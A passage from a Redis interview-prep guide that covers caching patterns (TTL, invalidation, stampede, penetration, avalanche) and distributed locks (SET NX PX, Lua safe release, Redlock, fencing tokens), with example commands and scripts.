**Pros:** only data that's actually requested gets cached (memory-efficient); resilient to cache failure (a down cache just means every read is a miss → slower, not broken); simple.

**Cons:** the **first request for a key is always a miss** (cold-start latency); there's a **staleness window** between a DB update and cache expiry/invalidation; and it's vulnerable to stampede when a hot key expires (Q9).

### Q3. Compare cache-aside, read-through, write-through, and write-behind.

| Pattern | Who loads on miss | When cache is written | Trade-off |
|---|---|---|---|
| **Cache-aside** | App | On read miss (app populates) | Simple, resilient, first-read miss + stale window |
| **Read-through** | Cache library | On read miss (cache populates) | Cleaner app code; needs a cache that supports it |
| **Write-through** | — | On every *write*, cache + DB together | Cache always fresh; higher write latency |
| **Write-behind** | — | On write to cache; async flush to DB | Fast writes; risk of data loss if cache dies |

- **Read-through** is cache-aside with the load logic moved *into* the cache layer, so the app just asks the cache and never sees the DB.
- **Write-through** writes go to cache and DB synchronously — reads are always fresh but every write pays both latencies.
- **Write-behind** acknowledges the write after hitting the cache and flushes to the DB asynchronously (batched) — great write throughput, but a crash before flush loses data.

Most systems use **cache-aside for reads** + **explicit invalidation on writes**; write-through/behind appear when write freshness or write throughput specifically demands them.

### Q4. Why does every cache key need a TTL?

A TTL is your **safety net against unbounded staleness and leaks**, even when you *also* invalidate explicitly:

1. **Bounds staleness** — if an explicit invalidation is ever missed (a bug, a dropped event, a failed delete), the TTL guarantees the stale value self-corrects within a known window. Without it, a missed invalidation is stale *forever*.
2. **Bounds memory** — unused keys eventually expire instead of accumulating and pushing you into eviction/`OOM`.
3. **Makes staleness a design decision** — you pick the TTL from your **staleness tolerance**: a stock price maybe 1s, a user profile maybe 5 min, a rarely-changing config maybe an hour.

Rule: **no cache key without a TTL.** The only real debate is how long, and whether to add **jitter** (randomize it a bit) so a batch of keys written together doesn't all expire at the same instant (avalanche — Q11).

### Q5. How do you choose a TTL?

Work from **staleness tolerance**, not gut feel:

- **How wrong can this value be, for how long, before it hurts?** A pricing page tolerates seconds; a "number of likes" counter tolerates minutes; a country list tolerates hours.
- **How expensive is a miss?** Cheap-to-recompute data can have a short TTL (fresher, low cost); expensive queries want longer TTLs to protect the DB.
- **How often does the source change?** Frequently-changing data with a long TTL just serves stale reads; pair it with explicit invalidation on write.
- **Add jitter** — instead of a flat `EX 300`, use `EX 300 ± random(0..60)` so keys populated in the same burst don't expire together and cause an avalanche.

A common design: a **base TTL as the safety net** plus **explicit delete-on-write** for freshness. The TTL covers the case where the invalidation is missed; the explicit delete covers the common case where you know the data changed.

### Q6. What is cache invalidation and why is it hard?

Cache invalidation is **making the cache reflect a change in the source of truth** — updating or removing a cached entry when the underlying data changes. It's famously "one of the two hard things in computer science" because the cache is a *copy*, and keeping a copy in sync with a mutating original across concurrent readers and writers is genuinely racy.

Three broad strategies:

1. **TTL-based (passive)** — let entries expire; simplest, but you serve stale data up to one TTL. Good when bounded staleness is acceptable.
2. **Explicit (write-time)** — on every write to the DB, delete or update the cached key. Freshest, but you must find *every* write path, and there's still a race window (Q7).
3. **Event-driven** — a change stream (DB CDC, or Redis **keyspace notifications**) triggers invalidation. Decouples writers from cache knowledge, but adds infrastructure and its own lag.

The hard part is that these overlap with concurrency: between "DB updated" and "cache updated," readers can repopulate the cache with a *stale* value. Which is why most designs combine explicit invalidation with a TTL backstop.

### Q7. On a write, should you delete the cached key or update it?

Both are used; **delete is the safer default.**

- **Delete-on-write (invalidate):** on DB update, `DEL` the key. Next read misses and repopulates from the fresh DB value. Simpler and less race-prone — you never write a *wrong* value into the cache, just force a reload. Downside: the next read pays a miss (and could stampede for a hot key).
- **Update-on-write (write-through-ish):** on DB update, `SET` the key to the new value directly. Avoids the reload miss, keeps the cache warm. Downside: it's racier — with concurrent writers, an out-of-order `SET` can leave a *stale* value cached (writer A's older value lands after writer B's newer one), and you cache values that might never be read (wasted work/memory).

The classic race with delete: reader misses, reads old DB value, and writes it to cache *just after* a writer's DEL — re-caching stale data. Mitigations include the "delete, write DB, delete again after a delay" (double-delete) pattern. **Rule of thumb: delete on write, rely on TTL as backstop, and use a lock/single-flight if the reload race matters.**

### Q8. What is a cache stampede (thundering herd) and how do you prevent it?

A **stampede** happens when a **popular (hot) key expires** and, in the instant after, **many concurrent requests all miss simultaneously** and all go recompute/reload from the DB at once — a thundering herd that can overwhelm the database exactly when the key is most in demand.

Mitigations (often combined):

1. **Single-flight / mutex lock** — let **only one** request recompute the key; the rest wait briefly and then read the freshly-populated cache (or serve slightly stale data). Implement with `SET lock:key token NX PX ...` (Q13).
2. **Serve-stale-while-revalidate** — keep the old value and let one request refresh in the background; others get the stale value instead of hitting the DB.
3. **Early / probabilistic recomputation** — refresh the key *before* it expires, with a probability that rises as expiry approaches (the XFetch algorithm), so one request refreshes early and the herd never all-misses at once.
4. **TTL jitter** — spread expiry times so hot keys don't all expire together (helps avalanche more than a single-key stampede, but still useful).

The key insight: a plain TTL doesn't just fail to prevent stampede — the synchronized expiry *causes* it. You need one of the above to serialize or pre-empt the recomputation.

### Q9. Show stampede protection for a hot key with a lock.

Single-flight: only one request recomputes; others wait and re-read.

```text
read(key):
    val = redis.GET(key)
    if val is not None:
        return val                         # hit

    # miss: try to become the single recomputer
    got = redis.SET("lock:"+key, token, NX=True, PX=5000)
    if got:                                # I won the lock
        val = db.query(key)
        redis.SET(key, val, EX=ttl_with_jitter)
        release_lock(key, token)           # atomic compare-del (Lua)
        return val
    else:                                  # someone else is recomputing
        sleep(short)                       # or serve stale if you kept it
        return redis.GET(key)              # read what they populated
```

The `SET lock:key token NX PX 5000` ensures exactly one request loads the DB; the rest briefly back off and read the value the winner wrote. Release the lock with the atomic Lua compare-and-delete so you never delete someone else's lock. A refinement is **serve-stale**: keep the expired value around (e.g. logical expiry stored *inside* the value with a longer physical TTL) so waiters get stale-but-fast data instead of blocking.

### Q10. What is cache penetration and how do you handle it?

**Cache penetration** is when requests repeatedly ask for keys that **don't exist in the DB either** — so they *always* miss the cache (nothing to cache) and *always* hit the DB. Common with malicious scanning (random/invalid IDs) or buggy clients. The cache provides zero protection because there's never a value to store.

Two standard defenses:

1. **Cache the negative result** — when the DB returns "not found," store a sentinel (empty value / null marker) in Redis with a **short TTL**, so repeated lookups of that nonexistent key hit the cache instead of the DB.

```bash
GET user:999999         # (nil) -> miss
# DB says not found:
SET user:999999 "__NULL__" EX 30    # cache the miss briefly
```

2. **Bloom filter** — keep a Bloom filter (e.g. RedisBloom) of keys that *do* exist. Before querying, check the filter; if it says "definitely not present," reject immediately without touching the DB. A Bloom filter never false-negatives, so it's safe to short-circuit on "not in filter."

Use short TTLs on negative caches so a key that *later* gets created isn't masked for long.

### Q11. What is cache avalanche and how is it different from stampede?

**Cache avalanche** is when a **large number of keys expire at nearly the same time** (or the cache node goes down entirely), so a flood of misses hits the DB across *many* keys at once — potentially taking the database down.

Difference from stampede:

- **Stampede/thundering herd** = **one hot key** expires → herd of concurrent requests for *that key*.
- **Avalanche** = **many keys** expire together (or whole cache lost) → broad flood across *many keys*.

Mitigations:

- **TTL jitter** — never give a batch of keys the exact same TTL; add randomness so expiry is spread over time. This is the #1 fix.
- **High availability** — replicas + Sentinel/Cluster so a single node failure doesn't wipe the whole cache; warmups after a cold start.
- **Request throttling / circuit breaking** to the DB — cap concurrent rebuilds so a partial avalanche doesn't cascade.
- **Multi-level / staggered TTLs** and background refresh for critical keys.

Root cause of avalanche is almost always **synchronized expiry** (e.g. you warmed the whole cache at deploy time with one flat TTL). Jitter it.

### Q12. How do you reason about cache/DB consistency?

Accept the premise: **a cache is an eventually-consistent replica of the source of truth.** With a separate cache and DB you cannot get free strong consistency — there's always a window where they disagree. Your job is to **bound** that window and choose acceptable behavior:

- **Staleness bound** = your TTL (worst case) combined with how promptly you invalidate on writes.
- **The read-after-write race** — a reader can repopulate the cache with a stale value in the gap between a DB update and the cache delete (Q7). Bound it with delete-on-write + short TTL, double-delete, or a version/timestamp check.
- **Ordering** — with `SET`-on-write, concurrent writers can land out of order and cache a stale value; delete-on-write avoids caching a specific wrong value.
- **Strong-consistency needs** — if a value truly cannot be stale (e.g. a balance shown at point of a transaction), don't cache it, or read-through the DB for that path.

The honest framing in an interview: *"I choose the consistency model per data type — most data tolerates bounded staleness (TTL + invalidate on write); the rare must-be-fresh field bypasses the cache."*

### Q13. Design the single-flight lock precisely — acquire and release.

**Acquire** an exclusive recompute lock with a unique token and TTL:

```bash
SET lock:profile:123 <unique-token> NX PX 3000
# NX = only if not exists; PX = auto-expire in 3s so a crashed holder can't deadlock
```

`NX` guarantees only one requester gets it. `PX` guarantees the lock releases even if the holder crashes mid-recompute (no permanent deadlock).

**Release** safely — only if you still own it — via atomic Lua (never a bare `DEL`, which could delete a lock that already expired and was re-taken by someone else):

```lua
if redis.call('GET', KEYS[1]) == ARGV[1] then
  return redis.call('DEL', KEYS[1])
end
return 0
```

Called as `EVALSHA <sha> 1 lock:profile:123 <unique-token>`. The unique token + compare-and-delete is what makes it correct. Size `PX` above your worst-case recompute time (or extend it with a watchdog). This is the building block behind stampede protection (Q9) and general distributed locking.

### Q14. What is client-side caching in Redis?

**Client-side caching** (Redis 6+, best over RESP3) lets the *client* keep a **local in-process cache** of hot keys, with Redis responsible for **telling the client when to invalidate**. This cuts round trips entirely for the hottest keys — a hit is served from local memory, not even a Redis call.

How it works — **server-assisted invalidation (tracking)**:

- The client enables tracking (`CLIENT TRACKING ON`, or RESP3 push mode).
- When the client reads a key, Redis remembers that this client cached it.
- When that key is **modified or evicted**, Redis pushes an **invalidation message** to the client, which drops its local copy.

There's a **broadcasting mode** (subscribe to key prefixes, get told about any change to matching keys, no per-key server bookkeeping) vs **default tracking** (server tracks exactly which keys each client cached — more memory on the server, fewer spurious invalidations).

It's ideal for keys read far more than written (config, feature flags, hot lookups). The trade-off is client complexity and a brief window where the local copy is stale before the invalidation arrives.

### Q15. How do you measure and improve cache hit rate?

**Measure it.** Redis exposes `keyspace_hits` and `keyspace_misses` in `INFO stats`:

```bash
INFO stats
# keyspace_hits:980000
# keyspace_misses:20000   -> hit rate = 980000/(980000+20000) = 98%
```

Hit rate = `hits / (hits + misses)`. Track it over time (and per-key-class in your app metrics) — a falling hit rate signals a problem (churny keys, too-short TTLs, eviction pressure, or a cold cache).

**Improve it:**

- **Cache the right things** — hot, expensive, read-heavy data; don't cache one-shot or rarely-read keys (they only cost memory and evict useful entries).
- **Right-size TTLs** — too short → needless misses; too long → staleness. Tune from data.
- **Give Redis enough memory** and an appropriate eviction policy (`allkeys-lru`/`allkeys-lfu`) so hot keys aren't evicted; watch `evicted_keys`.
- **Prevent stampede/penetration** — negative caching stops "always-miss" nonexistent keys from tanking the rate.
- **Warm the cache** for known-hot keys after a deploy/restart.

A healthy read cache is usually well above ~90% hits; below that, investigate before adding capacity.

### Q16. What should you cache, and what should you not?

**Cache:**

- **Read-heavy, write-light** data — read many times per write (profiles, catalogs, config, feature flags).
- **Expensive to produce** — slow joins, aggregations, rendered fragments, external API responses.
- **Hot / repeatedly requested** — the same keys accessed constantly.
- **Tolerant of some staleness** — a few seconds/minutes of lag is acceptable.

**Don't (or be careful):**

- **Rarely-read data** — caching it wastes memory and evicts useful keys; hurts hit rate.
- **Data that must be perfectly fresh** — balances at point of transaction, security-critical checks; bypass or read-through.
- **Very large values read whole** — a multi-MB blob can create a **big key** (O(N) to serialize, memory spikes, blocks the single thread); consider chunking or not caching.
- **Highly volatile data written more than read** — you'd invalidate constantly; the cache churns without paying off.

The filter is simple: **high read-to-write ratio + expensive to compute + tolerant of staleness = cache it.** Otherwise reconsider.

### Q17. Walk through invalidation on update for a user profile.

Cache-aside read + delete-on-write, with a TTL backstop:

```text
# READ
get_profile(id):
    v = redis.GET("user:"+id)
    if v: return v                     # hit
    v = db.load_profile(id)            # miss
    redis.SET("user:"+id, v, EX=300 + rand(0..60))   # TTL + jitter
    return v

# WRITE
update_profile(id, changes):
    db.update_profile(id, changes)     # 1. write source of truth FIRST
    redis.DEL("user:"+id)              # 2. invalidate cache
```

Order matters: **write the DB first, then delete the cache.** If you deleted the cache first, a concurrent reader could reload the *old* DB value and re-cache it before the DB write landed. Even in this order a narrow race exists (a reader loads old data and writes it just after the DEL); defenses are a short TTL (self-heals fast) or a **double-delete** (DEL, do the write, then DEL again after a small delay). For a hot profile, wrap the read-miss reload in a **single-flight lock** (Q9) so an invalidation storm doesn't stampede the DB.

### Q18. Design a cache layer for a read-heavy service.

A structured answer hitting the axes an interviewer wants:

1. **Pattern:** cache-aside for reads (app checks Redis, loads DB on miss, populates with TTL), plus **explicit delete-on-write** for freshness. DB is source of truth; Redis degrades gracefully to "slower" if down.

2. **Keys & TTL:** clear key scheme (`user:{id}`, `product:{id}:summary`); every key gets a **TTL sized to staleness tolerance, with jitter** to prevent avalanche.

3. **Invalidation:** delete-on-write (write DB first, then `DEL`), TTL as backstop for missed invalidations; event-driven (CDC / keyspace notifications) if writers are decoupled from the cache.

4. **Stampede protection:** for hot keys, **single-flight** via `SET NX PX` lock (or serve-stale-while-revalidate / probabilistic early refresh) so one request rebuilds while others wait or serve stale.

5. **Penetration:** **negative-cache** not-found results with a short TTL (or a Bloom filter) so invalid IDs don't hammer the DB.

6. **Avalanche/HA:** TTL jitter + a replicated/HA Redis (Sentinel or Cluster) so one node failure or synchronized expiry doesn't flood the DB.

7. **Capacity & eviction:** set `maxmemory` with `allkeys-lru`/`lfu` (a cache *wants* eviction); watch `evicted_keys` and fragmentation; avoid big keys.

8. **Observability:** track **hit rate** (`keyspace_hits/misses`), latency, evictions, and DB fallback rate; alert on hit-rate drops.

9. **Scale-out:** Redis Cluster to shard the keyspace; use **hash tags** for keys that must be co-located; read replicas if read volume exceeds one node.

Close by naming the trade-off: the cache is an **eventually-consistent** copy; most fields tolerate bounded staleness, and the rare must-be-fresh field bypasses the cache entirely.
## Distributed Locks

### Summary

**What this topic covers**

How to use Redis as a **distributed lock** — a mutual-exclusion primitive that works across processes and servers so that, at any instant, at most one worker holds a named lock and runs a critical section (a singleton cron job, a "process this order once" guard, a leader election). The 16 questions here walk from the naive one-liner (`SET lock NX PX`) to the sharp edges that separate a junior answer from a senior one: **why a naive `DEL` is a correctness bug**, the **safe compare-and-delete release via Lua**, the **lock-expiry-vs-work-duration race** and watchdog lease-extension, the **Redlock** multi-node algorithm, and the famous **Kleppmann-vs-antirez debate** about whether a Redis lock is ever *safe* without **fencing tokens**. The one sentence you must be able to say: a Redis lock is fine for **efficiency** (don't do duplicate work) but not sufficient for **correctness** (guarantee at-most-one) under GC pauses, clock skew and network delay unless the protected resource enforces a fencing token.

**Mental model**

A distributed lock in Redis is just a well-known **key whose existence means "held"**. Acquire = atomically create the key only if absent, with a TTL. Release = delete the key — but only if it's still *your* lock. Everything hard about distributed locking comes from two facts: (1) the holder can **pause or die** at any moment (GC pause, container freeze, network partition), and (2) the TTL that saves you from deadlock is the same TTL that can **expire mid-work and hand your lock to someone else**. So there is no TTL value that is simultaneously safe against deadlock and safe against double-execution — you trade one risk for the other, or you add machinery (watchdog renewal, fencing tokens). Treat the lock as **advisory and best-effort**, not as a hard mutex. If two holders running at once would corrupt data or double-charge a customer, a Redis lock alone is the wrong tool; you need a linearizable store (ZooKeeper/etcd) or a fencing token the downstream resource checks.

**Key terms**

- **Mutual exclusion** — at most one holder of the lock at a time; the whole point.
- **`SET key val NX PX ms`** — atomic acquire: `NX` = set only if not exists, `PX` = TTL in ms so a dead holder can't deadlock forever.
- **Lock token** — a unique random value stored as the lock's value, proving ownership so release is safe.
- **Safe release** — Lua compare-and-delete: `DEL` only if the stored value still equals my token.
- **TTL / auto-release** — the expiry that prevents permanent deadlock but risks premature release.
- **Watchdog / lease extension** — a background timer that renews the TTL while work is still running (Redisson does this).
- **Redlock** — antirez's multi-master algorithm: acquire on a majority of N independent Redis nodes within a time bound.
- **Fencing token** — a monotonically increasing number handed out per acquisition; the protected resource rejects stale tokens, giving true correctness.
- **Reentrancy** — the same holder can re-acquire a lock it already owns (needs a count).
- **Split-brain / failover loss** — a single-instance lock's write can be lost on failover because replication is async.

**Why interviewers ask this**

"Implement a distributed lock and tell me what can go wrong" is a favourite because the happy path is a one-liner and the failure modes are where seniority shows. A junior writes `SETNX lock 1` then `DEL lock` and is done. A mid-level adds a TTL and a random token. A senior unprompted raises: the `DEL`-someone-else's-lock bug, the expiry-vs-work-duration race, why the release must be atomic (Lua), what Redlock buys and what Kleppmann says it doesn't, and — crucially — **when a Redis lock is good enough (efficiency) versus when you must reach for fencing tokens or a consensus system (correctness)**. It's a compact test of concurrency reasoning, atomicity, failure modes, and knowing the limits of your tools.

**Common confusions**

- "`DEL lock` releases my lock" — it releases *whatever lock currently exists*, possibly one another client acquired after yours expired. Must compare-and-delete.
- "A TTL makes the lock safe" — the TTL prevents deadlock but *creates* the premature-release race. It's a trade, not a fix.
- "Redlock makes Redis locks safe for correctness" — Kleppmann argues it doesn't, without fencing tokens; even antirez frames Redis locks as efficiency-oriented.
- "The lock is held for exactly the TTL" — no; a GC pause or slow syscall can make your *code* think it holds the lock long after Redis expired it.
- "`SET NX` on one primary is HA" — a single-instance lock can vanish on failover because the write hadn't replicated (async replication).

**What follows from this topic**

Distributed locks are one member of the family of coordination and concurrency patterns Redis is used for. The same atomic-Lua discipline reappears in **Rate Limiting, Sessions & Common Patterns** (token-bucket limiters, reliable queues) and rests on the atomicity guarantees from the transactions/scripting topic. The failover-loss caveat here is the same async-replication window explored in **Replication** and its HA cousins Sentinel and Cluster — understanding *why* a single-instance lock is unsafe on failover requires the replication mental model.

### Q1. Why would you use Redis for a distributed lock, and when is it the right tool?

Use it when several processes or servers might do the **same work concurrently** and you want only one to proceed: a cron that must run as a singleton across a fleet, "only one worker charges this invoice", leader election, guarding a shared external resource. Redis is attractive because a lock is a single atomic `SET`, it's already in your stack, it's fast, and the TTL gives automatic cleanup if a holder dies.

The key qualifier: it's the right tool when a double-run is **wasteful but not catastrophic** — you'd rather not send two emails, but a rare duplicate is survivable. That's the **efficiency** use case. When a double-run is **catastrophic** (double-spend, corrupting a ledger), a Redis lock alone is not sufficient — you need fencing tokens or a consensus system (ZooKeeper/etcd). State this distinction and you've answered the real question.

### Q2. Show the simple single-instance lock and explain why each part matters.

```bash
# acquire: token is a unique random value (e.g. a UUID) per attempt
SET lock:order:123 9f3c7a2e-uuid NX PX 30000
# -> OK if acquired, nil if someone else holds it
```

- **`lock:order:123`** — the well-known key; its existence means "held".
- **random token value** — proves ownership so release can be safe. Never use a constant like `1`.
- **`NX`** — set only if not exists. This is the atomic acquire; without it, check-then-set is a race.
- **`PX 30000`** — a 30s TTL. If the holder crashes without releasing, the lock auto-expires so the system doesn't deadlock forever.

Doing it in one `SET` is essential: the old two-step `SETNX` + `EXPIRE` had a window where a crash between the two commands left a lock with no TTL — a permanent deadlock. Modern `SET ... NX PX` is atomic and is the correct idiom.

### Q3. Why is releasing the lock with `DEL lock` a bug, and what's the correct release?

The bug: your critical section runs longer than the TTL, so Redis **expires your lock**. Another client now legitimately acquires `lock:order:123` with its own token. Then your slow code finishes and calls `DEL lock:order:123` — deleting **the other client's** lock. Now a third client can acquire it too. You've silently broken mutual exclusion.

The fix is **compare-and-delete, atomically**: only delete if the stored value is still *my* token. You can't do "GET then DEL" from the client (another race), so use a Lua script that Redis runs atomically:

```bash
EVAL "if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end" 1 lock:order:123 9f3c7a2e-uuid
```

If the token no longer matches (someone else holds it now), the script deletes nothing and returns 0. This is the canonical safe unlock.

### Q4. Walk through the lock-expiry-vs-work-duration problem.

The TTL is a bet on how long the work takes. If work occasionally runs longer than the TTL — a slow DB query, a GC pause, a paused container — the lock **expires while you still think you hold it**. Another worker acquires it, and now **two holders run the critical section simultaneously**. The compare-and-delete release protects you from deleting the wrong lock, but it does **not** prevent the two-holders overlap itself.

Mitigations, roughly in order:
- **Conservative TTL** — longer than the realistic worst-case work time. Cost: a real crash means a longer deadlock before auto-release.
- **Watchdog / lease extension** — a background timer that periodically renews the TTL (e.g. every TTL/3) while work is in progress, and stops on completion or crash. Redisson does this by default.
- **Fencing tokens** — the only thing that makes overlap *safe* rather than merely *less likely*, by having the downstream resource reject the stale holder.

The honest senior line: no single TTL is both deadlock-safe and overlap-safe. Renewal reduces the odds; fencing tokens remove the danger.

### Q5. What is a watchdog / lease-extension mechanism?

A **watchdog** is a background task the lock client runs while it holds the lock. It periodically extends the TTL — for example, if the lease is 30s, renew it every ~10s — using a Lua compare-and-extend so it only renews if the client still owns the token:

```bash
EVAL "if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('pexpire', KEYS[1], ARGV[2]) else return 0 end" 1 lock:order:123 9f3c7a2e-uuid 30000
```

While the process is healthy the lock never expires under it, so long-running work doesn't get its lock stolen. If the process **crashes or freezes**, the watchdog stops renewing and the lock expires on schedule — so you still get automatic deadlock recovery. This is exactly what Redisson's default lock does. The trade-off: a frozen-but-not-dead holder (long GC pause where the watchdog thread also stalls) can still lose its lock, which is why watchdogs improve efficiency but don't deliver correctness guarantees on their own.

### Q6. Explain the Redlock algorithm. What problem does it solve?

A single-instance lock has a single point of failure: if that primary dies (or fails over and the lock write hadn't replicated), the lock is lost. **Redlock** (antirez's algorithm) spreads the lock across **N independent Redis masters** (typically 5, no replication between them) to survive a minority of node failures. To acquire:

1. Get the current time.
2. Try to `SET ... NX PX` the same key+token on all N nodes, each with a short per-node timeout.
3. The lock is acquired only if you got it on a **majority (⌊N/2⌋+1)** of nodes **and** the total elapsed time is less than the TTL (so the lock's remaining validity is positive).
4. The effective validity = TTL minus elapsed acquisition time.
5. If you failed to get a majority (or ran out of time), **release on all nodes** and optionally retry after a random delay.

Release deletes the token on all nodes. Redlock trades the simplicity of one node for tolerance of single-node failures — but see the next question for the debate about whether it's actually *safe*.

### Q7. Summarise the Kleppmann vs antirez debate. What's the practical takeaway?

Martin Kleppmann's "How to do distributed locking" argued **Redlock is not safe for correctness**. His core points: distributed systems have unbounded **GC pauses**, **network delays**, and **clock skew**. A client can acquire the lock, then pause (a long GC) past the TTL; Redis expires the lock, another client acquires it, and when the first client wakes it *still believes it holds the lock* and writes — two writers. Redlock relies on bounded timing assumptions that real systems violate, so no amount of nodes fixes it. His prescription: use **fencing tokens** — the lock service issues a monotonically increasing token per acquisition, and the protected resource **rejects any write carrying a token lower than the highest it has seen**. That makes the stale writer's write get rejected, which is real safety.

antirez defended Redlock as reasonable given practical assumptions and noted fencing can be layered on. The practical takeaway to give in an interview: **Redis locks (single-instance or Redlock) are good enough for efficiency — avoiding duplicate work — but for correctness (guaranteed at-most-one on a resource that must not be double-written) you need fencing tokens enforced by the resource, or a linearizable coordination system like ZooKeeper/etcd.** Say that nuance unprompted and you've passed.

### Q8. What is a fencing token and how does it give true correctness?

A **fencing token** is a strictly increasing integer the lock service hands out on each successful acquisition (acquire #1 → token 33, next acquire → 34, and so on). The client passes its token with every write to the protected resource, and **the resource remembers the highest token it has accepted and rejects any write with a lower or equal token**.

Why it fixes the two-writers problem: if client A acquires (token 33), pauses, its lock expires, and client B acquires (token 34) and writes, the resource now knows the highest token is 34. When A wakes and writes with token 33, the resource **rejects it** — 33 < 34. A's stale write can't corrupt anything even though A *thought* it held the lock. The correctness moves out of the (unreliable) timing of the lock and into a monotonic check at the resource. The catch: the protected resource must *support* the check — a plain filesystem or a legacy API that ignores your token gives you no protection. In Redis you can source the monotonic token with `INCR fence:counter` at acquire time.

### Q9. Why is the auto-release TTL both a safety feature and a danger?

It's **safety** because without it a holder that crashes (or is partitioned) would leave the lock held **forever** — every other worker deadlocks waiting on a lock no one will ever release. The TTL guarantees the lock eventually frees itself.

It's **danger** because the TTL is a fixed timer that doesn't know whether your work is actually finished. If the work outruns the TTL, Redis releases a lock you still believe you hold → two concurrent holders. So the same mechanism that saves you from deadlock exposes you to double-execution. Choosing the TTL is choosing which risk you'd rather run: too short favours availability but risks overlap; too long favours safety but lengthens deadlock after a crash. Watchdog renewal and fencing tokens exist precisely because no static TTL resolves this tension.

### Q10. How do you make a Redis lock reentrant?

A **reentrant** lock lets the *same* holder acquire it again (e.g. a method that already holds the lock calls another method that also locks) without deadlocking itself, releasing only when the outer-most acquisition releases. A plain `SET NX` isn't reentrant — the second acquire fails.

The usual implementation uses a **hash** keyed by owner id with a **count**, driven by Lua so it's atomic:

```bash
# acquire/increment if unlocked or owned by me; else fail
EVAL "if redis.call('exists', KEYS[1]) == 0 or redis.call('hexists', KEYS[1], ARGV[1]) == 1 then redis.call('hincrby', KEYS[1], ARGV[1], 1); redis.call('pexpire', KEYS[1], ARGV[2]); return 1 else return 0 end" 1 lock:res owner-uuid 30000
```

Release decrements the count and only `DEL`s the key when it reaches zero. This is essentially how Redisson's reentrant lock works (hash field = thread id, value = hold count). Mention that reentrancy is a client/library concern layered on top of the primitive, not something Redis provides natively.

### Q11. How do you handle lock fairness and contention (thundering herd on a lock)?

The naive `SET NX` lock is **unfair**: when it frees, all waiters race and whoever `SET`s first wins, so a request can starve. Two things to address:

- **Avoid busy-spin.** Don't hammer `SET NX` in a tight loop — that's a CPU and network storm. Retry with **backoff and jitter**, or use a wait mechanism.
- **Fairness (FIFO).** If order matters, put waiters in a **queue** (a Redis list) and grant the lock to the head, or use a library that implements a fair lock (Redisson's fair lock keeps a queue of thread ids and a timeout set). Redis pub/sub or a blocking pop (`BRPOP`) can wake the next waiter instead of polling.

In interviews, note the trade-off: fair locks add coordination overhead and are slower; most systems are fine with unfair locks plus jittered retry, and only reach for fairness when starvation is an observed problem.

### Q12. Why does a single-instance lock lose safety on failover?

Redis replication is **asynchronous**: the primary replies `OK` to your `SET lock ... NX PX` **before** that write has reached its replica. Now suppose the primary crashes an instant later and Sentinel/Cluster promotes the replica. The promoted replica **never received the lock key**, so it looks unlocked — and a *second* client can acquire the "same" lock. You now have two holders, each convinced it's the sole owner.

This is a fundamental consequence of async replication, not a bug you can configure away (see the **Replication** topic's data-loss-window discussion). `WAIT` can reduce the window by blocking until N replicas ack, but it's not a full fix and hurts latency. Redlock was designed partly to dodge this by using independent masters with no replication, and fencing tokens make the residual overlap harmless. The one-liner: **a single-instance Redis lock is not safe across a failover, because the acquiring write can be lost before it replicates.**

### Q13. Write a correct safe-unlock and explain it line by line.

```bash
EVAL "
if redis.call('get', KEYS[1]) == ARGV[1] then
  return redis.call('del', KEYS[1])
else
  return 0
end
" 1 lock:job:nightly 9f3c7a2e-uuid
```

- `KEYS[1]` = the lock key, `ARGV[1]` = my token.
- `get` reads the current owner token, and the whole script runs **atomically** — Redis is single-threaded, so nothing can interleave between the `get` and the `del`.
- If the stored token equals mine, I still own it → `del` releases it (returns 1).
- If it differs (my lock expired and someone else re-acquired), the guard is false → return 0, deleting **nothing**.

The atomicity is the whole point: a client-side `GET` then `DEL` has a race where the lock could be re-acquired between the two calls. Bundling the check and delete into one Lua evaluation closes that window.

### Q14. Design a singleton cron job across a fleet of workers using Redis.

Goal: N identical workers each fire the cron every minute, but only **one** should actually run the job.

```bash
# each worker, at tick time, tries to grab the lease for this run
SET cron:reports:2026-07-03T09:00 <worker-token> NX PX 55000
# winner (OK) runs the job; losers (nil) skip this tick
```

Design notes:
- **Bucket the key by the scheduled time** (`...T09:00`) so each scheduled tick has exactly one lease and a late/duplicate tick can't double-run.
- **TTL ≈ the interval** (here ~55s for a 1-min job) so the lease self-heals if the winner dies, and the next tick gets a fresh key anyway.
- If the job can run **longer than the interval**, use a watchdog to extend the lease, or a separate longer TTL, so a slow run doesn't overlap the next tick.
- For anything where a double-run would corrupt data, add a **fencing token** and make the job's writes idempotent — belt and braces. For pure "avoid duplicate emails" efficiency, the lock alone is enough.

### Q15. "Implement a distributed lock and tell me what can go wrong." Give the full answer.

**Acquire:** `SET lock:res <random-token> NX PX <ttl>` — atomic, unique token, TTL to avoid deadlock.
**Release:** Lua compare-and-delete so you only delete your own lock.

**What can go wrong:**
- **Deleting someone else's lock** — if you `DEL` without checking the token after your lock expired mid-work. Fixed by compare-and-delete.
- **Two holders at once** — work outruns the TTL; the lock expires and another client acquires it. Mitigated by conservative TTL + watchdog renewal; only *fixed* by fencing tokens.
- **GC pause / process freeze** — you pause past the TTL and wake up still believing you hold the lock. Same two-holders risk; fencing tokens make the stale write harmless.
- **Failover loss** — async replication means the acquire write can be lost when a replica is promoted, so two clients acquire. Redlock or fencing addresses this.
- **Non-atomic release** — client-side GET-then-DEL races. Use Lua.
- **Clock skew** — TTL correctness depends on comparable clocks; badly skewed nodes break timing assumptions (a Redlock concern).

**Bottom line:** great for efficiency, insufficient for correctness without fencing tokens or a consensus system. Delivering exactly this structure is the senior answer.

### Q16. When should you reach for ZooKeeper/etcd instead of a Redis lock?

Reach for **ZooKeeper or etcd** when correctness — true at-most-one — is non-negotiable and you can't rely on the resource enforcing fencing tokens. These systems are built on consensus (ZAB / Raft), give **linearizable** operations and **strong consistency**, and their locks are based on ephemeral/sequential nodes that vanish when the client session dies (no TTL guessing) and that naturally produce monotonic sequence numbers you can use as **fencing tokens**. That's a stronger safety story than async-replicated Redis.

The trade-off is cost and latency: consensus systems are slower, more operationally heavyweight, and add another dependency. So the decision rule: use **Redis** when the lock is an **efficiency** optimisation (avoid duplicate work, rare overlaps are survivable) and you want speed and simplicity; use **ZooKeeper/etcd** (or a database with proper transactions/unique constraints) when a double-holder would **corrupt data or violate an invariant** and you need real mutual exclusion. And regardless of the lock service, if the protected resource supports fencing tokens, use them — that's what actually makes concurrent access safe.

## Rate Limiting, Sessions & Common Patterns

### Summary

**What this topic covers**

